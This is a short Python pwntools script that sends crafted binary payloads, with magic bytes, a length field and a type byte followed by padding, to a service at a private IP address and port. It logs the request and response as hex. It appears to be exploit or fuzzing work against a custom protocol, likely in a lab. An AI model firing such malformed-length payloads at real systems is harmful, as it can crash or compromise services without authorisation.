#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
import pwn

context.log_level = "debug"
context.endian = "big"

p = remote("192.168.245.135", 27700)

# payload = "\xaa\xbb\xff\xff" + p16(0x38) + "\xde" + "a" * 0x37

payload = "\xaa\xbb\xff\xff" + p16(0x38) + "\xde" + "\x00\x64" + "a" * 0x35
#
# payload = "\xaa\xbb\xff\xff" + p16(0x2bb0) + "\xde" + "\x00\x64" + "a" * (0x2bb0 - 2 - 1)

p.send(payload)

data = p.recv(1024)

print data
tran = {}

tran['send'] = payload.encode('hex')
tran['recv'] = data.encode('hex')
import json

print json.dumps(tran)
